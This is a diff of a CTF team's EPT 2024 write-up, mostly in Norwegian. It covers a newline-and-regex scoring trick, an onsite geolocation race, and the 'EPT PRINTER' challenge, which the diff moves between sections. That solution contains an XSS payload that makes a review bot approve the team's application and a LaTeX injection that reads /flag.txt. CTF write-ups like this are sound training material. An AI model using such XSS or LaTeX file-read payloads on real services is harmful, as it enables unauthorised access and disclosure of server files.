@@ -1,4 +1,6 @@
-<h1>EPT 2024</h1>
+<style>#title {font-size: 2.5em;}h3 {font-size: 1.2em;}img{max-height:500px;}</style>
+
+<h1 id="title">EPT 2024</h1>
 
 # MISC
 
@@ -20,6 +22,33 @@ if re.match("^[1-3]{1,3}$", inp):
 ```
         
 ### Løsning
+
+Løsningen er å sende dobbel `\n` på slutten av tallene. Dette fungerer fordi pythoncoden kun fjerner den siste \n fra stringen.
+
+```python
+if inp and inp[-1] == '\n':
+		inp = inp[:-1]
+```
+
+Siden `$` matcher `\n` vil du passere regexsjekken:
+
+```py
+if re.match("^[1-3]{1,3}$", inp):
+```
+
+Men hvorfor vil vi ha med en ekstra `\n`? Jo det er fordi `.get(c, 1)` har angitt en default verdi, `1`. Derfor vil `\n` føre til at vi scorer ett ekstra poeng:
+
+```py
+for c in inp:
+    value = {
+        "1": 1,
+        "2": 2,
+        "3": 3
+    }.get(c, 1)
+    state += value
+```
+
+Dette gjør at dine skudd gir totalt 10 poeng. Derfor klarer du å slå **dad** når han skyter scoren opp til 19.
 
 ```bash
 (echo -n "333\n\n"; cat) | ncat --ssl game.ept.gg 1337
@@ -45,7 +74,6 @@ The total score is now 20
 You win! Here are my dads final words to you:
 ```
 
-Løsningen er å sende dobbel `\n` på slutten av tallene. Dette gjør at du får inn ett ekstra skudd slik at totalen blir 10. Derfor klarer du å slå **dad** når han skyter scoren opp til 19.
 
 <details>
 <summary>Flagg</summary>
@@ -293,6 +321,119 @@ Vi fant også ut at KQL godtar regex. Derfor skal det også være mulig å kjør
 
 
 
+# ONSITE
+
+## EPT PRINTER
+
+### Oppgave
+
+EPT Print var en utskriftstjeneste med en Flask-backend. De ferdige utskriftene kunne printes onsite.
+
+For å bruke printeren må en først verifiseres. I tillegg til Flask-serveren var det en bot som kjørte en headless nettleser for å åpne og gjennomgå disse søknadene, men uten å godkjenne dem.
+
+### Løsning
+
+Først trenger vi å bli godkjent for å få bruke printeren. Det kan vi gjøre med å injecte XSS slik at botten som godkjenner søknaden godkjenner den automatisk:
+
+```html
+<img src="x" onerror="document.getElementById('submit').click();">
+```
+
+Når vi blir approved for å bruke printene forsøker vi å utnytte at vi kan skrive LaTeX til å¨lese en eventuell flaggfil:
+
+```latex
+\begingroup
+\catcode`\%=12
+\catcode`\_=12
+\input{/flag.txt}
+\endgroup
+```
+
+`\catcode`\%=12` og `\catcode`\_%_=12` er lagt til for at eventuelle `%` og `_` ikke skal tolkes som LaTeX før det printes. Dette viste seg å være nødvendig ettersom flagget inneholdt `_`.
+
+<details>
+<summary>Flagg</summary>
+
+`EPT{Y0U_4R3_4_PR1NT3R_M4ST3R}`
+</details>
+
+
+## Walkaround (multithreaded solution)
+
+### Solution
+
+Once the first baby tasks where solved it was time to check out this one.
+
+The first image was quickly solved to an approximate location. Suhslok rushed out to run for the flag, meanwhile Brille became *the guy in the chair*.
+
+<img src="image-3.png" style="width:100%;max-width:500px">
+
+After researching the image we found that it was just north of the Munch Museum, with Sørenga in the backgound. As noone had solved the challenge yet, we wanted to be as fast as possible. After just a few minutes our field agent sent this in chat:
+
+<img src="image-4.png" style="width:100%;max-width:500px">
+
+Therefore we had to up the game to be faster for the next locations to beat the competition.
+
+<img src="image-2.png" style="width:100%;max-width:500px">
+
+Now headed for the next location *the guy in the chair* provided a gps grid of the exact location:
+
+<img src="image-5.png" style="width:100%;max-width:500px">
+
+Ez find.
+
+Now for the next one HQ wanted to find the exact location to make it a fast run. Brille dropped the Streetview man and got the exact angle the image was taken. This way the distance of the runner could be optimized to the brim:
+
+<img src="image.png" style="width:100%;max-width:500px">
+
+And now we are headed for the last location:
+
+<img src="image-1.png" style="width:100%;max-width:500px">
+
+As the local knower he is "Byens beste bebab" was not a hard find for Suhslok. With one exception:
+
+**Dronningens Kebab has recently moved to a new location**
+
+But after Suhslok recievs a GPS grid from HQ this becomes a quick find:
+
+<img src="image-6.png" style="width:100%;max-width:500px">
+
+So then it is just to submit...
+
+<img src="image-10.png" style="width:50%;max-width:250px">
+<img src="image-9.png" style="width:50%;max-width:250px">
+
+<img src="image-7.png" style="width:50%;max-width:250px">
+<img src="image-8.png" style="width:50%;max-width:250px">
+
+What???
+
+H.w. h.o .?.. how?
+
+Two flags subitted side by side. For the same team? Oh man.
+
+
+### Heisans Perspective:
+
+After completing the onsite Wooden Treasure Hunt I went to explore the streets of Oslo. On my way out of the venue I got up to the first local woman I saw and showed her the first picture. Perf! now I know where to go! I then rented a VOI and scooted to the first location. As the "Harstadværing" I am, I dont know Oslo. Therefor i just asked around to get my answers.
+
+On my way to the Opera I passed a little kid running for his life to compete with me. Puh... **He stands no chance**
+
+Dronningens was quickly found with a Google search. Boom! Flag already captured?
+
+
+## Last notes
+
+Key takeaway from this is that two threads in a process doesn't communicate with each other. Therefore solving the problem in parallel is not always the best solution. : )
+
+<details>
+<summary>Flagg</summary>
+
+`EPT{1_w1ll_w4lk_f1v3_hundr3d_m1l3s}`
+</details>
+
+
+
 # OSINT
 
 ## DIGITAL ARCHIVES
@@ -372,41 +513,6 @@ int main(){
 
 
 # WEB
-
-## EPT PRINTER
-
-### Oppgave
-
-EPT Print var en utskriftstjeneste med en Flask-backend. De ferdige utskriftene kunne printes onsite.
-
-For å bruke printeren må en først verifiseres. I tillegg til Flask-serveren var det en bot som kjørte en headless nettleser for å åpne og gjennomgå disse søknadene, men uten å godkjenne dem.
-
-### Løsning
-
-Først trenger vi å bli godkjent for å få bruke printeren. Det kan vi gjøre med å injecte XSS slik at botten som godkjenner søknaden godkjenner den automatisk:
-
-```html
-<img src=x onerror="document.getElementById('submit').click();">
-```
-
-Når vi blir approved for å bruke printene forsøker vi å utnytte at vi kan skrive LaTeX til å¨lese en eventuell flaggfil:
-
-```latex
-\begingroup
-\catcode`\%=12
-\catcode`\_=12
-\input{/flag.txt}
-\endgroup
-```
-
-`\catcode`\%=12` og `\catcode`\_%_=12` er lagt til for at eventuelle `%` og `_` ikke skal tolkes som LaTeX før det printes. Dette viste seg å være nødvendig ettersom flagget inneholdt `_`.
-
-<details>
-<summary>Flagg</summary>
-
-`EPT{Y0U_4R3_4_PR1NT3R_M4ST3R}`
-</details>
-
 
 ## IMAGES
 
